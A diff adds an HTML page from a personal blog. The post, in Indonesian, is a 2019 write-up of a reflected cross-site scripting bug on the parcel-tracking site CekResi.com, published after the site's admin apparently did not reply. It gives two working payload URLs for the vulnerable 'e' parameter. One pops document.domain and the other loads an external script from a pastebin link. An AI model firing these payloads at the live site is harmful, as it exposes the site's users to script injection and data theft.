@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Cross Site Scripting on Cekresi - Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Cross Site Scripting di website Cekresi.com" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Cross Site Scripting on Cekresi" />
+<meta property="og:description" content="Cross Site Scripting di website Cekresi.com" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/xss-cekresi/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-07-24T22:02:54+07:00" />
+<meta property="article:modified_time" content="2019-07-24T22:02:54+07:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cross Site Scripting on Cekresi"/>
+<meta name="twitter:description" content="Cross Site Scripting di website Cekresi.com"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.d902908ac6e0fab67957de5db5aea1b6455b19ae2ca98eac4c95a4a0fdc02238.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css" media="(prefers-color-scheme: dark)"  />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+	
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+		
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Beranda</a>
+		
+		<a href="/posts">Postingan</a>
+		
+		<a href="/about">Tentang</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Cross Site Scripting on Cekresi</h1>
+			<div class="meta">Posted on Jul 24, 2019</div>
+		</div>
+		
+
+		<section class="body">
+			<p>Hai lur, kali ini sedikit tulisan tentang salah satu bug yang saya temukan pada website <a href="https://cekresi.com/">CekResi.com</a> ya karena ndak ada balasan email dari dari admin web tersebut, ya udah ku write up aja daripada ku simpan sendiri hehe.</p>
+<figure><img src="https://cekresi.com/images/cek-resi-logo.png"/><figcaption>
+            <h4>Logo Cekresi</h4>
+        </figcaption>
+</figure>
+
+<p>CekResi.com sendiri adalah website yang populer untuk melakukan tracking barang yang dikirim atau diterima lewat nomer RESI yang di berikan dari kantor pemaketan.
+Awal aku menemukan bug ini ketika disuruh atasanku mengecek resi pengiriman dokumen ke kantor pusat tempat aku bekerja, nah aku inget ada website CekResi.com untuk sekedar mentracking barang sudah sampai mana. Nah kumasukkan nomer resinya dan mengetahui bahwa paket sudah sampai ke Jakarta. Aku ingat disana ada form input nomer resi, ku coba isi dengan payload XSS sederhana, namun gagal.</p>
+<p>Tidak berhenti di situ, saya mencoba menginstall firefox quantum dan hackbar quantum, kebetulan di sana ada <em>auto input parameter</em> dengan script XSS. Dan ternyata aku menemukan sebuah parameter dimana bisa di masukkan payload XSS.</p>
+<p>Parameter yang ku temukan seperti berikut <a href="https://cekresi.com/m/index?viewstate=&amp;e=&amp;noresi=">https://cekresi.com/m/index?viewstate=&amp;e=&amp;noresi=</a> pada parameter <strong>e=</strong> disitu saya menyisipkan payload XSS sederhanya <code>&quot;&gt;&lt;script&gt;prompt(document.domain);&lt;/script&gt;</code> untuk memunculkan nama domain dari website cekresi.com sehingga url nya menjadi seperti ini :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">cekresi</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">m</span><span style="color:#f92672">/</span><span style="color:#a6e22e">index</span><span style="color:#f92672">?</span><span style="color:#a6e22e">viewstate</span><span style="color:#f92672">=&amp;</span><span style="color:#a6e22e">e</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&gt;&lt;script&gt;prompt(document.domain);&lt;/script&gt;&amp;noresi=TAN 
+</span></span></span></code></pre></div><p>Berikut penampakannya :
+<figure><img src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi.png"/><figcaption>
+            <h4>Boom :D</h4>
+        </figcaption>
+</figure>
+</p>
+<p>Tak sampai disitu, saya juga mencoba untuk menggunakan script html dalam XSS kali ini dan ternyata berhasil. Berikut payloadnya :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">cekresi</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">m</span><span style="color:#f92672">/</span><span style="color:#a6e22e">index</span><span style="color:#f92672">?</span><span style="color:#a6e22e">viewstate</span><span style="color:#f92672">=&amp;</span><span style="color:#a6e22e">e</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&gt;&lt;script src=https://pastebin.com/raw/mUBsAPXz/&gt;&lt;/script&gt;&amp;noresi=TAN 
+</span></span></span></code></pre></div><p>Berikut penampakannya :
+<figure><img src="https://raw.githubusercontent.com/tanmyid/go-blog/master/img/xss-cekresi/xss-cekresi-2.png"/><figcaption>
+            <h4>Script HTML</h4>
+        </figcaption>
+</figure>
+</p>
+<p>Eh iya lupa, ini hanya berlaku pada browser mozilla firefox ya, kalian pasti sudah tau alasannya dong. Nah semoga bermanfaat bagi kalian. Terima Kasih.</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pentest">pentest</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+	</article>
+</main>
+<footer >
+    <div style="display:flex"><a class="soc" href="https://github.com/tanmyid" rel="me" title="GitHub"><i data-feather="github"></i></a>
+      <a class="border"></a><a class="soc" href="https://twitter.com/athulcajay/" rel="me" title="Facebook"><i data-feather="facebook"></i></a>
+      <a class="border"></a><a class="soc" href="https://t.me/tanmyid" rel="me" title="Telegram"><i data-feather="send"></i></a>
+      <a class="border"></a></div>
+    <div class="footer-info">
+      <strong>[</strong>2023  © Tanio <strong>]</strong> 
+    </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
